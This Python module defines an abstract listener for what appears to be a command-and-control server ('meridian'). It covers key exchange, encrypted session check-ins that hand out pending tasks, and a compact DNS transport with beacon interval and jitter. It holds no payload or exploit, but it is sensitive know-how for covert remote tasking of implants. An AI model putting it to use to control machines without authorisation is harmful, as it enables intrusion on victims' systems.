"""Listener abstraction."""

from __future__ import annotations

import abc
import json
import logging
import threading
from typing import Any

from ..crypto import CryptoError

log = logging.getLogger("meridian.listener")


class Listener(abc.ABC):
    """A transport endpoint. Subclasses own a blocking serve loop."""

    name: str = "base"
    transport: str = "base"

    def __init__(self, app: Any, cfg: Any):
        self.app = app
        self.cfg = cfg
        self._thread: threading.Thread | None = None
        self.running = False

    # ------------------------------------------------------------ lifecycle
    def start(self) -> None:
        if self.running:
            return
        self.running = True
        self._thread = threading.Thread(target=self._run, name=f"listener-{self.name}", daemon=True)
        self._thread.start()
        log.info(
            "%s listener '%s' on %s:%s",
            self.transport.upper(), self.name, self.cfg.host, self.cfg.port,
            extra={"event": "listener_start", "listener": self.name,
                   "transport": self.transport, "host": self.cfg.host, "port": self.cfg.port},
        )

    def stop(self) -> None:
        self.running = False
        self._shutdown()
        log.info(
            "listener '%s' stopped", self.name,
            extra={"event": "listener_stop", "listener": self.name},
        )

    def _shutdown(self) -> None:  # override to unblock sockets
        return None

    @abc.abstractmethod
    def _run(self) -> None:
        """Blocking serve loop."""

    # ------------------------------------------------------------- handlers
    def handle_kex(self, body: bytes) -> dict:
        """Common KEX logic shared by all transports. body = JSON bytes."""
        data = json.loads(body)
        return self.app.sessions.kex(
            client_pub_b64=data["client_pub"],
            client_nonce_b64=data["client_nonce"],
            meta=data.get("meta", {}),
            profile=data.get("profile"),
            listener=self.name,
            default_interval=self.app.config.default_interval,
            default_jitter=self.app.config.default_jitter,
        )

    def handle_checkin(self, session_id: str, plaintext: dict) -> dict:
        """Process a decrypted checkin; returns {'tasks': [...]}."""
        crypto = self.app.sessions.get_crypto(session_id)
        if crypto is None:
            raise CryptoError("unknown session")
        self.app.sessions.checkin(
            session_id,
            plaintext.get("results", []),
            meta=plaintext.get("meta"),
        )
        tasks = self.app.tasks.pending(session_id)
        return {"tasks": [t.to_dict() for t in tasks], "session_id": session_id}

    def seal_reply(self, session_id: str, payload: dict) -> dict:
        crypto = self.app.sessions.get_crypto(session_id)
        if crypto is None:
            raise CryptoError("session has no key material")
        return crypto.seal(json.dumps(payload).encode())

    def open_envelope(self, session_id: str, envelope: dict) -> dict:
        crypto = self.app.sessions.get_crypto(session_id)
        if crypto is None:
            raise CryptoError("session has no key material")
        plaintext = crypto.open(envelope)
        return json.loads(plaintext)

    # ------------------------------------------------ compact (DNS) framing
    def handle_dns_kex(self, payload: bytes) -> bytes:
        """payload = FRAME_KEX | client_pub(32) | client_nonce(16).

        Returns FRAME_KEX | sid(16) | server_pub(32) | server_nonce(16)
                 | interval(u16be) | jitter(u8 = %).
        """
        import base64 as _b64

        from ..crypto import FRAME_KEX, b64d

        if len(payload) != 1 + 32 + 16 or payload[0] != FRAME_KEX:
            raise CryptoError("bad dns kex")
        client_pub_b64 = _b64.b64encode(payload[1:33]).decode()
        client_nonce_b64 = _b64.b64encode(payload[33:49]).decode()
        kex = self.app.sessions.kex(
            client_pub_b64=client_pub_b64,
            client_nonce_b64=client_nonce_b64,
            meta=None,
            profile=None,
            listener=self.name,
            default_interval=self.app.config.default_interval,
            default_jitter=self.app.config.default_jitter,
        )
        interval = int(kex["interval"])
        jitter_pct = int(round(float(kex["jitter"]) * 100))
        out = (
            bytes([FRAME_KEX])
            + bytes.fromhex(kex["session_id"])
            + b64d(self.app.config.server_pub_b64)
            + b64d(kex["server_nonce"])
            + interval.to_bytes(2, "big")
            + bytes([jitter_pct])
        )
        return out

    def handle_dns_checkin(self, session_id: str, framed: bytes) -> bytes:
        """framed = FRAME_CHECKIN | nonce | ct; AAD binds it to session_id."""
        crypto = self.app.sessions.get_crypto(session_id)
        if crypto is None:
            raise CryptoError("unknown session")
        inner = crypto.open_compact(framed)
        payload = json.loads(inner)
        reply = self.handle_checkin(session_id, payload)
        return crypto.seal_compact(json.dumps(reply).encode())
